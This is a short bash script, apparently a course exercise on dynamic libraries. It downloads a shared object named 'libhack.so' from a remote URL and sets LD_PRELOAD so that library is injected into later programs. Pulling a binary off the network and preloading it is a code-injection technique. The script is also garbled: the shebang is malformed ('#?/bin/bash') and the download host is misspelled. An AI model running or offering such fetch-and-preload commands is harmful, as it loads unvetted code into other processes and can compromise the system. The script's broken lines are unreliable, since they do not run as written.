#?/bin/bash
wget -p ..  https://raw.githbusercontent.com/1Gift3/alx-low_level_programming/master/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD="$PWD/../libhack.so"
